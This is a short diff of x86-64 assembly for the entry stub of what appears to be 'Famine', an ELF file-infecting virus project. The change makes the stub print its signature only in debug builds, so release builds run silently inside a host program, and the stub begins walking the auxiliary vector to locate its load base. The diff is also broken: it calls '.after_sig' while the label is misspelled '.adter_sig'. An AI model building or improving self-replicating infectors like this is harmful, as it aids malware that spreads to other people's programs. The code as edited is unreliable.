@@ -1,21 +1,27 @@
 BITS 64
 global stub
 
+%ifndef DEBUG
+%define DEBUG 0
+%endif
+
 stub:
 	mov r15, rdx ; save rdx (rtld_fini) before write syscall clobbers it
 	mov rbp, rsp ; save initial RSP for auxv walk
 
-	call after_string
-	db "Famine version 1.0 (c)oded by cbopp-mvan-wij", 44
+	call .after_sig
 
-after_string:
+.sig:
+	db "Famine version 1.0 (c)oded by cbopp-mvan-wij", 10
+
+.adter_sig:
 	pop rsi
-
-	; write signature
-	mov rax, 1	; sys_write
-	mov rdi, 1	; fd = stdout
-	mov rdx, 45	; length
+%if DEBUG
+	mov rax, 1 ; sys_write
+	mov rdi, 1 ; fd = stdout
+	mov rdx, .after_sig - .sig ; len
 	syscall
+%endif
 
 	; get load_base via auxv AT_PHDR
 	; initial stack at rbp: [argc][argv][NULL][envp][NULL][auxv]
